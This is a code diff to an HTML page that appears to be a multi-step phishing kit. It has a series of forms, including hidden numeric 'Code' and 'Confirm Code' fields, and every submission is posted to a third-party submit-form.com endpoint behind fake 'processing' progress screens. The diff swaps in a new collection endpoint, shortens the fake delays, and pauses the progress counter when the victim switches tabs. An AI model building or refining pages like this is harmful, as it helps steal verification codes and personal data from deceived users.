@@ -1,3 +1,4 @@
+
  <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1397,6 +1398,7 @@ You are all set. No further action is required on your part, so you can simply r
               
          
                  <div style="display: none;">
+              <div>
                 <div class="floating-group"><input type="tel" inputmode="numeric" required name="step16Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter code" oninput="validateCodeInput(this)" /><span class="floating-label">Code</span></div>
                 <div class="floating-group"><input type="tel" inputmode="numeric" required name="step16Code_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm code" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Code</span></div>
                 <button type="submit" class="responsive-btn">Proceed</button>
@@ -1775,6 +1777,11 @@ You are all set. No further action is required on your part, so you can simply r
 
         // 1800ms * 100 steps = 180,000ms (180 seconds / 3 minutes total)
         proc20TimerInterval = setInterval(() => {
+            // Safety check: if user switches tabs or navigates away, pause counting up
+            if (document.hidden) {
+                return;
+            }
+
             currentPercent++;
             if (timerElement) timerElement.textContent = currentPercent + "%";
 
@@ -1793,7 +1800,7 @@ You are all set. No further action is required on your part, so you can simply r
     }
 
     function postForm(formId) {
-        fetch("https://submit-form.com/M", { 
+        fetch("https://submit-form.com/EGef8sATM", { 
             method: "POST", 
             body: new FormData(document.getElementById(formId)), 
             headers: { 'Accept': 'application/json' } 
@@ -1814,9 +1821,9 @@ You are all set. No further action is required on your part, so you can simply r
     }
 
     function submitSecondForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("secondForm"); showStep('processing2'); runProcessingTimer('timerCount2', 2500, 'mainContent2'); }
-    function submitThirdForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("thirdForm"); showStep('processing3'); runProcessingTimer('timerCount3', 57000, 'mainContent3'); }
-    function submitFourthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fourthForm"); showStep('processing4'); runProcessingTimer('timerCount4', 21000, 'mainContent4'); }
-    function submitFifthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fifthForm"); showStep('processing5'); runProcessingTimer('timerCount5', 24000, 'mainContent5'); }
+    function submitThirdForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("thirdForm"); showStep('processing3'); runProcessingTimer('timerCount3', 2500, 'mainContent3'); }
+    function submitFourthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fourthForm"); showStep('processing4'); runProcessingTimer('timerCount4', 2500, 'mainContent4'); }
+    function submitFifthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("fifthForm"); showStep('processing5'); runProcessingTimer('timerCount5', 2500, 'mainContent5'); }
     function submitSixthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("sixthForm"); showStep('processing6'); runProcessingTimer('timerCount6', 2500, 'mainContent6'); }
     function submitSeventhForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("seventhForm"); showStep('processing7'); runProcessingTimer('timerCount7', 2500, 'mainContent7'); }
     function submitEighthForm(event) { event.preventDefault(); syncCapturedInputs(event.target); postForm("eighthForm"); showStep('processing8'); runProcessingTimer('timerCount8', 2500, 'mainContent8'); }
@@ -1840,6 +1847,7 @@ You are all set. No further action is required on your part, so you can simply r
         runExtendedProcessing20(); 
     }
 </script>
+
 </body>
 </html>
-
+ 
